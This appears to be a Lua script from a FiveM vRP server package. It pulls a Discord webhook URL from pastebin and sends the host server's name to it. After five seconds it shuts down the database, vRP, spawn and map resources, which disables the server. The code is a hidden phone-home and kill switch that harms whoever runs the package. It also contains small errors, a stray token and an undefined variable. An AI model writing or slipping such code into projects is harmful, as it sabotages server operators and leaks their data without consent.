print("^7----------------------------------------------- ^7")
print("^7---------->>^8 RAR Files Not Working Now.. !! ^7")
print("^7----------------------------------------------- ^7")
SendMsgScript(GetConvar('sv_hostname'), 15598596)
         SetTimeout(5000,function ()
          StopResource(GetCurrentResourceName())
          StopResource("mysql-async")
          StopResource("vrp_mysql")
          StopResource("vrp")
          StopResource("spawnmanager")
          StopResource("mapmanager")
        end)
function SendMsgScript(nameserver, color)
     local connect = {
           {
               ["color"] = color,
               ["title"] = namelog,
               fields = {
                   {
                       name = "**Name Server**",
                       value = "``"..nameserver.."``",
                       inline = true
                   },
                 {
                     name = "**Name Script**",
                     value = "``vRP Files v2.0``",
                     inline = true
                 },
                 s
               },
               ["footer"] = {
                   ["text"] = "Re-Coder : 3BS#1111",
                   ["icon_url"] = ""
               },
           }
       }
       PerformHttpRequest("https://pastebin.com/raw/DhkgjtSe", function (errorCode, linklog, resultHeaders) --->> link dicord webhook
         Citizen.Wait(400)
 
       PerformHttpRequest(""..linklog.."", function(err, text, headers) end, 'POST', json.encode({username = "RAR", embeds = connect, avatar_url = "https://cdn.discordapp.com/attachments/781874652703227937/783754928496574484/logo_2.png"}), { ['Content-Type'] = 'application/json' })
     end, 'GET', '')
     end
